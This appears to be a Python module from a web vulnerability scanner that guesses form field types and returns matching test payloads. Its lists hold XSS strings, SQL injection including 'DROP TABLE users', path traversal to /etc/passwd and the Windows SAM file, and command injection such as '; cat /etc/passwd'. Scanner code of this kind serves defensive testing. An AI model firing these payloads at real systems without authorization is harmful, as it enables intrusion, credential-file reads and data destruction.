"""Context-aware payload generation based on input type detection."""

from __future__ import annotations
from enum import Enum
from typing import Optional


class InputType(Enum):
    """Detected input types for contextual payload selection."""
    
    TEXT = "text"
    NUMBER = "number"
    EMAIL = "email"
    URL = "url"
    DATE = "date"
    PHONE = "phone"
    TEXTAREA = "textarea"
    SELECT = "select"
    CHECKBOX = "checkbox"
    RADIO = "radio"
    HIDDEN = "hidden"
    FILE = "file"
    PASSWORD = "password"
    SEARCH = "search"
    JSON = "json"
    XML = "xml"
    UNKNOWN = "unknown"


def detect_input_type(field_name: str, field_type: Optional[str] = None, field_value: Optional[str] = None) -> InputType:
    """Detect input type from field name, type attribute, and value."""
    
    name_lower = field_name.lower()
    type_lower = (field_type or "").lower()
    
    # Type attribute takes priority
    if type_lower:
        type_map = {
            "email": InputType.EMAIL,
            "number": InputType.NUMBER,
            "url": InputType.URL,
            "date": InputType.DATE,
            "tel": InputType.PHONE,
            "phone": InputType.PHONE,
            "textarea": InputType.TEXTAREA,
            "select": InputType.SELECT,
            "checkbox": InputType.CHECKBOX,
            "radio": InputType.RADIO,
            "hidden": InputType.HIDDEN,
            "file": InputType.FILE,
            "password": InputType.PASSWORD,
            "search": InputType.SEARCH,
            "text": InputType.TEXT,
        }
        if type_lower in type_map:
            return type_map[type_lower]
    
    # Field name heuristics
    if any(keyword in name_lower for keyword in ["email", "mail", "user_email"]):
        return InputType.EMAIL
    if any(keyword in name_lower for keyword in ["phone", "tel", "mobile"]):
        return InputType.PHONE
    if any(keyword in name_lower for keyword in ["url", "link", "href", "website"]):
        return InputType.URL
    if any(keyword in name_lower for keyword in ["date", "birth", "created"]):
        return InputType.DATE
    if any(keyword in name_lower for keyword in ["password", "pwd", "pass"]):
        return InputType.PASSWORD
    if any(keyword in name_lower for keyword in ["file", "upload", "attachment"]):
        return InputType.FILE
    if any(keyword in name_lower for keyword in ["json", "data_json"]):
        return InputType.JSON
    if any(keyword in name_lower for keyword in ["xml", "data_xml"]):
        return InputType.XML
    if any(keyword in name_lower for keyword in ["id", "count", "page", "limit", "qty"]):
        return InputType.NUMBER
    
    return InputType.UNKNOWN


def get_contextual_payloads(input_type: InputType, vuln_type: str = "xss") -> list[str]:
    """
    Get payloads tailored to the detected input type.
    Reduces false positives and increases detection accuracy.
    """
    
    if vuln_type == "xss":
        return _get_xss_payloads(input_type)
    elif vuln_type == "sqli":
        return _get_sqli_payloads(input_type)
    elif vuln_type == "path_traversal":
        return _get_path_traversal_payloads(input_type)
    elif vuln_type == "command_injection":
        return _get_command_injection_payloads(input_type)
    else:
        return _get_generic_payloads(input_type)


def _get_xss_payloads(input_type: InputType) -> list[str]:
    """XSS payloads adapted to input type."""
    
    base_xss = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>",
    ]
    
    if input_type == InputType.URL:
        return [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert('XSS')",
        ]
    elif input_type == InputType.EMAIL:
        return [
            "<script>alert('XSS')</script>",
            "test+<script>alert('XSS')</script>@example.com",
        ]
    elif input_type == InputType.JSON:
        return [
            '{"key":"<script>alert(\'XSS\')</script>"}',
            '{"xss":"<img src=x onerror=alert(\'XSS\')>"}',
        ]
    elif input_type == InputType.XML:
        return [
            '<?xml version="1.0"?><root><xss><script>alert(\'XSS\')</script></xss></root>',
            '<?xml version="1.0"?><root attr="<script>alert(\'XSS\')</script>"></root>',
        ]
    elif input_type == InputType.NUMBER:
        # XSS in numeric context is less likely but test
        return ["1; <script>alert('XSS')</script>"]
    elif input_type == InputType.HIDDEN:
        # Hidden fields are less commonly vulnerable
        return ["<script>alert('XSS')</script>"]
    
    return base_xss


def _get_sqli_payloads(input_type: InputType) -> list[str]:
    """SQL injection payloads adapted to input type."""
    
    base_sqli = [
        "'",
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
    ]
    
    if input_type == InputType.NUMBER:
        # Numeric context - try without quotes
        return [
            "1 OR 1=1",
            "1; DROP TABLE users--",
            "1 UNION SELECT NULL--",
            "1' OR '1'='1",
        ]
    elif input_type == InputType.EMAIL:
        # Email context - SQL injection in email field
        return [
            "admin'--",
            "' OR 'a'='a",
            "admin' OR '1'='1",
        ]
    elif input_type == InputType.JSON:
        # JSON context
        return [
            '{"query":"\'"}',
            '{"id":"1 OR 1=1"}',
        ]
    elif input_type == InputType.DATE:
        # Date context
        return [
            "2024-01-01' OR '1'='1",
            "2024-01-01; DROP TABLE users--",
        ]
    
    return base_sqli


def _get_path_traversal_payloads(input_type: InputType) -> list[str]:
    """Path traversal payloads adapted to input type."""
    
    base_pt = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
    ]
    
    if input_type == InputType.FILE or "file" in input_type.value:
        return [
            "../../../etc/passwd",
            "../../etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "C:\\windows\\system32\\config\\sam",
        ]
    elif input_type == InputType.URL:
        return [
            "file:///etc/passwd",
            "file:///windows/system32/config/sam",
        ]
    elif input_type == InputType.JSON:
        return [
            '{"file":"../../../etc/passwd"}',
        ]
    
    return base_pt


def _get_command_injection_payloads(input_type: InputType) -> list[str]:
    """Command injection payloads adapted to input type."""
    
    base_cmd = [
        "; cat /etc/passwd",
        "| whoami",
        "` whoami `",
        "$(whoami)",
    ]
    
    if input_type == InputType.TEXT or input_type == InputType.SEARCH:
        return [
            "; cat /etc/passwd",
            "| whoami",
            "` whoami `",
            "&& whoami",
            "|| whoami",
        ]
    elif input_type == InputType.JSON:
        return [
            '{"cmd":"; cat /etc/passwd"}',
        ]
    
    return base_cmd


def _get_generic_payloads(input_type: InputType) -> list[str]:
    """Generic payloads for unknown input types."""
    
    return [
        "test123",
        "<script>alert('test')</script>",
        "'; DROP TABLE--",
        "../../../etc/passwd",
    ]


def get_payload_strategy(input_type: InputType) -> dict[str, str]:
    """
    Get analysis strategy for an input type.
    Helps scanner know which vulnerability tests are most relevant.
    """
    
    strategies = {
        InputType.EMAIL: {
            "primary": "xss,sqli",
            "secondary": "ldap_injection",
            "skip": "file_upload",
        },
        InputType.NUMBER: {
            "primary": "sqli,path_traversal",
            "secondary": "integer_overflow",
            "skip": "xxe",
        },
        InputType.URL: {
            "primary": "open_redirect,ssrf",
            "secondary": "xss,sqli",
            "skip": "file_upload",
        },
        InputType.FILE: {
            "primary": "file_upload,xxe",
            "secondary": "path_traversal",
            "skip": "csrf",
        },
        InputType.JSON: {
            "primary": "xss,sqli,xxe",
            "secondary": "deserialization",
            "skip": "none",
        },
        InputType.XML: {
            "primary": "xxe,xss",
            "secondary": "xml_bomb",
            "skip": "none",
        },
        InputType.PASSWORD: {
            "primary": "none",
            "secondary": "none",
            "skip": "all",  # Don't test password fields
        },
        InputType.HIDDEN: {
            "primary": "xss",
            "secondary": "sqli",
            "skip": "none",
        },
    }
    
    return strategies.get(
        input_type,
        {
            "primary": "xss,sqli",
            "secondary": "path_traversal",
            "skip": "none",
        },
    )
